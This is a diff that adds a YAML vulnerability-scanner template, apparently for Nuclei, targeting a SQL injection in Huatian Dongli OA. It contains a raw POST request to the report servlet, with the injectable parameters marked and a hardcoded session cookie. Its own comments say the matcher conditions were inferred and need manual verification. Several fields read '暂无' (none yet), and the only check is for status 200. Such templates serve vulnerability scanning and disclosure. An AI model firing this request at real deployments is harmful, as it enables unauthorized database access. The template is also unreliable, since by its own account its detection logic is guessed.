@@ -1,0 +1,56 @@
+id: poc-td52t0eqd27lcy0i
+info:
+  name: 华天动力OA SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/td52t0eqd27lcy0i
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: td52t0eqd27lcy0i
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /report/reportServlet?action=8 HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: JSESSIONID=D207AE96056400942620F09D34B8CDF3
+
+
+
+
+    year=*&userName=*&startDate=*&endDate=*&dutyRule=*&resultPage=%2FreportJsp%2FshowRepo
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
